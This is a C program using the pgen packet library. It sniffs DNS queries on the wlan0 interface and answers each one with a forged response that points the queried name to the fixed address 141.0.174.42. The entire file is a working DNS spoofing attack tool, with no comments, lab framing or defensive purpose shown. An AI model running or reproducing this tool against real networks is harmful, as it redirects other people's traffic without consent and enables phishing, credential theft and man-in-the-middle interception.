#include <pgen.h>
#include <pcap.h>
#include <sniff.h>
#include <string.h>

const char* dev = "wlan0";

bool callback(const bit8* packet, int len){
	pgen_dns recv;
	recv.CAST(packet, len);

	if(recv.IP.protocol != 17)		return true;
	if(!( recv.UDP.dst == 53 ))return true;
	
	


	ipaddr tmp;
	tmp = recv.IP.src;
	recv.IP.src  = recv.IP.dst;
	recv.IP.dst  = tmp;

	int ptmp = recv.UDP.src;
	recv.UDP.src = recv.UDP.dst;
	recv.UDP.dst = ptmp;
	
	recv.DNS.flags.qr = 1;
	recv.DNS.flags.ra = 1;
	recv.DNS.ancnt    = 1;
	recv.DNS.query.name = recv.DNS.query.name;
	recv.DNS.answer.type = 1;
	recv.DNS.answer.cls  = 1;
	recv.DNS.answer.ttl  = 5;
	recv.DNS.answer.len  = 4;
	recv.DNS.answer.addr = "141.0.174.42";


	printf("==============================================================\n");
	recv.SUMMARY();
	for(int i=0; i<1; i++){
		recv.SEND(dev);
	}
	printf("==============================================================\n");
	
	return true;
}


int main(int argc, char** argv){
	sniff(dev, callback);
}
